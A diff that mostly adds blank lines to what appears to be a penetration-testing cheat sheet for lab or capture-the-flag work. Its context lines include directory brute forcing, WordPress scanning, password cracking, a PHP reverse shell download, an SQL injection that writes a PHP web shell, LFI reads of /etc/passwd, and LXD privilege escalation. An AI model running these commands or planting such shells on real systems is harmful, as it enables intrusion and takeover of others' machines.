@@ -137,7 +137,9 @@ wfuzz -c -t 500 --hc=400,404,403 --basic admin:admin -w /opt/dirsearch/db/dicc.t
 
 ### http cms
 https://www.einstijn.com/penetration-testing/website-username-password-brute-forcing-with-hydra/
+
 https://github.com/Dionach/CMSmap
+
 https://github.com/NoorQureshi/WPSeku-1
 ```bash
 wpscan --url <URL> --enumerate p
@@ -197,7 +199,9 @@ john hash_wp --wordlist=/usr/share/wordlists/rockyou.txt
 
 ### shells
 https://netsec.ws/?p=337
+
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#perl
+
 https://book.hacktricks.xyz/shells/shells/msfvenom
 ```bash
 wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
@@ -298,6 +302,7 @@ select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE '/var/www/html/
 
 ### LFI
 https://www.hackingarticles.in/apache-log-poisoning-through-lfi/
+
 https://chryzsh.gitbooks.io/pentestbook/content/local_file_inclusion.html
 ```bash
  curl http://192.168.148.80/console/file.php?file=/etc/passwd
@@ -339,7 +344,6 @@ https://0xdf.gitlab.io/2020/04/22/htb-nineveh.html
 
 LFI mail
 https://guide.offsecnewbie.com/network-pen#things-to-remember
-
 ```
 
 ### Interactive shell
@@ -360,6 +364,7 @@ stty -a # get rows and colummns
 
 ### Escape restricted shell
 https://www.hacknos.com/rbash-escape-rbash-restricted-shell-escape/
+
 https://null-byte.wonderhowto.com/how-to/escape-restricted-shell-environments-linux-0341685/
 ```bash
 user@host:~$ vim
@@ -504,6 +509,7 @@ sudo nmap --script=$TF
 
 ### Linux capabilities
 https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities
+
 https://materials.rangeforce.com/tutorial/2020/02/19/Linux-PrivEsc-Capabilities/
 ```bash
 getcap -r / 2>/dev/null
@@ -548,6 +554,7 @@ find / -perm -o w -type d 2>/dev/null
 
 ### Scheduled tasks
 https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy32s
+
 https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s
 
 Check writables
@@ -586,8 +593,8 @@ done
 
 ### Containers
 https://www.hackingarticles.in/lxd-privilege-escalation/
-https://p0i5on8.github.io/posts/hackthebox-brainfuck/
 
+https://p0i5on8.github.io/posts/hackthebox-brainfuck/
 ```bash
 kali$ id
 kali$ git clone https://github.com/saghul/lxd-alpine-builder.git
@@ -614,10 +621,15 @@ chmod 777 /tmp/update
 
 ### Cipher
 https://www.dcode.fr/cipher-identifier
+
 https://gchq.github.io/CyberChef/
+
 https://www.tunnelsup.com/hash-analyzer/
+
 https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm
+
 https://asecuritysite.com/encryption/ferdecode
+
 MD5 hashes.org
 https://cryptii.com/pipes/caesar-cipher
 
